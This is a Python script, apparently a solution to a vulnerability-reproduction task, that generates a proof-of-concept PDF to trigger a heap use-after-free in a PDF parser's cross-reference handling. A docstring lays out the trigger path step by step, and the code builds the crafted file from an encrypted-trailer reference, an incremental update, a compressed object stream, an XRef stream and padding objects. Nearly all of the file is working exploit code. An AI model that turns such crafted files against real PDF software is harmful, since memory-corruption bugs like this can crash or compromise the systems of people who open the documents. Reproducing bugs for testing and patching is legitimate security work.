import zlib

class Solution:
    """
    Generates a PoC for a Heap Use After Free vulnerability in PDF parsing.
    """

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a use-after-free on a `pdf_xref_entry` pointer. It can be
        triggered when a pointer to an xref entry is held across a call that might
        cause the xref table to be "solidified" (rebuilt), freeing the old table.
        This scenario occurs in `pdf_cache_object` when it recursively calls itself
        to load an object stream.

        This PoC creates a PDF with an incremental update. The main document part's
        trailer references an /Encrypt dictionary (object 10) which is not yet defined.
        The incremental update then defines object 10 inside an object stream (object 11).
        The update is described by an XRef stream (object 12).

        The intended execution flow to trigger the UAF is as follows:
        1. The parser starts from the end of the file, finds the `startxref`, and loads
           the XRef stream (obj 12).
        2. It parses the trailer from the XRef stream, which contains `/Encrypt 10 0 R`.
        3. To resolve this, `pdf_load_object(10)` is called, which in turn calls
           `pdf_cache_object(10)`.
        4. Inside `pdf_cache_object(10)`, the xref entry for object 10 is retrieved.
           This entry indicates that object 10 is compressed within object stream 11.
           A pointer to this xref entry is held.
        5. To extract object 10, the parser must first load object 11. `pdf_cache_object`
           recursively calls `pdf_load_object(11)`.
        6. The call to `pdf_load_object(11)` (and its inner `pdf_cache_object(11)`)
           triggers an xref solidification because the document was loaded via an
           incremental update. This rebuilds the xref table in memory and frees the old one.
        7. The pointer to the xref entry for object 10, obtained in step 4, is now
           dangling as it points to freed memory.
        8. The recursive call returns. The original `pdf_cache_object(10)` invocation
           resumes.
        9. It then attempts to use the dangling pointer to update the xref entry,
           resulting in a Heap Use After Free.

        A large number of padding objects are included to increase the size of the
        xref table. This makes it more likely that the memory region of the freed
        table is reused or unmapped, leading to a detectable crash.
        """
        
        poc = bytearray()
        offsets = {}

        # Part 1: Initial PDF structure
        header = b"%PDF-1.7\n%\xa1\xb2\xc3\xd4\n"
        poc.extend(header)

        # Basic document objects
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        offsets[1] = len(poc)
        poc.extend(obj1)

        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        offsets[2] = len(poc)
        poc.extend(obj2)

        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n"
        offsets[3] = len(poc)
        poc.extend(obj3)
        
        # Part 1 XRef Table
        xref1_offset = len(poc)
        xref1 = bytearray(b"xref\n0 4\n")
        xref1.extend(b"0000000000 65535 f \n")
        xref1.extend(f"{offsets[1]:010d} 00000 n \n".encode('ascii'))
        xref1.extend(f"{offsets[2]:010d} 00000 n \n".encode('ascii'))
        xref1.extend(f"{offsets[3]:010d} 00000 n \n".encode('ascii'))
        poc.extend(xref1)

        # Part 1 Trailer. It points to the /Encrypt object which will be defined
        # in the incremental update. This sets up the initial call.
        # Size is an estimate of the final object count.
        total_obj_count = 300
        trigger_obj_num = 10
        trailer1 = f"trailer\n<< /Size {total_obj_count} /Root 1 0 R /Encrypt {trigger_obj_num} 0 R >>\n".encode('ascii')
        trailer1 += f"startxref\n{xref1_offset}\n%%EOF\n".encode('ascii')
        poc.extend(trailer1)
        
        # Part 2: Incremental Update
        num_padding_objs = 150
        padding_obj_start_num = 20
        padding_content = b'A' * 10

        for i in range(num_padding_objs):
            obj_num = padding_obj_start_num + i
            obj_str = f"{obj_num} 0 obj\n({padding_content.decode('ascii')}{i})\nendobj\n".encode('ascii')
            offsets[obj_num] = len(poc)
            poc.extend(obj_str)

        # The object stream containing the trigger object
        objstm_num = trigger_obj_num + 1
        trigger_obj_content = b"<</V 4 /Filter /Standard>>"
        
        obj_stream_header = f"{trigger_obj_num} 0 ".encode('ascii')
        obj_stream_uncompressed = obj_stream_header + trigger_obj_content
        obj_stream_compressed = zlib.compress(obj_stream_uncompressed)

        objstm_str = f"{objstm_num} 0 obj\n<</Type /ObjStm /N 1 /First {len(obj_stream_header)} /Length {len(obj_stream_compressed)} /Filter /FlateDecode>>\nstream\n".encode('ascii')
        objstm_str += obj_stream_compressed
        objstm_str += b"\nendstream\nendobj\n"
        offsets[objstm_num] = len(poc)
        poc.extend(objstm_str)

        # The XRef Stream that describes the incremental update
        xrefstm_num = objstm_num + 1
        
        # /W field sizes: [type, offset/objstmnum, gen/index]
        w = [1, 5, 2] 
        xref_stream_content = bytearray()

        # Entry for trigger object (compressed)
        xref_stream_content.extend((2).to_bytes(w[0], 'big'))
        xref_stream_content.extend(objstm_num.to_bytes(w[1], 'big'))
        xref_stream_content.extend((0).to_bytes(w[2], 'big'))

        # Entry for object stream (uncompressed)
        xref_stream_content.extend((1).to_bytes(w[0], 'big'))
        xref_stream_content.extend(offsets[objstm_num].to_bytes(w[1], 'big'))
        xref_stream_content.extend((0).to_bytes(w[2], 'big'))

        # Entries for padding objects
        for i in range(num_padding_objs):
            obj_num = padding_obj_start_num + i
            xref_stream_content.extend((1).to_bytes(w[0], 'big'))
            xref_stream_content.extend(offsets[obj_num].to_bytes(w[1], 'big'))
            xref_stream_content.extend((0).to_bytes(w[2], 'big'))
            
        index_array = f"[{trigger_obj_num} 2 {padding_obj_start_num} {num_padding_objs}]"
        
        # Using a single line for the dictionary to save space
        xref_dict_str = f"<</Type/XRef/Size {total_obj_count}/W [{w[0]} {w[1]} {w[2]}]/Index {index_array}/Root 1 0 R/Encrypt {trigger_obj_num} 0 R/Prev {xref1_offset}/Length {len(xref_stream_content)}>>"

        xrefstm_obj = f"{xrefstm_num} 0 obj\n{xref_dict_str}\nstream\n".encode('ascii')
        xrefstm_obj += xref_stream_content
        xrefstm_obj += b"\nendstream\nendobj\n"
        offsets[xrefstm_num] = len(poc)
        poc.extend(xrefstm_obj)

        # Final trailer
        final_trailer = f"startxref\n{offsets[xrefstm_num]}\n%%EOF\n".encode('ascii')
        poc.extend(final_trailer)

        return bytes(poc)
